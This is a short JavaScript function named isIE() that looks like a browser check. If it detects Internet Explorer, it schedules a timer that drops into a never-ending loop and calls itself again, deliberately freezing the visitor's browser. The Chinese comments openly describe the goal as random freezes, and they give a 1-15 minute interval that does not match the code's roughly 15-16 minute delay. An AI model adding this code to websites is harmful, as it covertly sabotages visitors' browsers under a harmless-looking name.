function isIE() {
    if (!!window.ActiveXObject || "ActiveXObject" in window) {
        window.setTimeout(function () {
            // 随机卡一次时长不一的死循环
            for (var i = 0; ; i++) {
                if (i > Math.floor(Math.random() * 9999999 + 1000000)) {
                    isIE()
                }
            }
        },
            // 1-15分钟随机卡一次
            Math.floor(Math.random() * (1000 * 60) + (1000 * 60 * 15)))
    }
}

isIE()
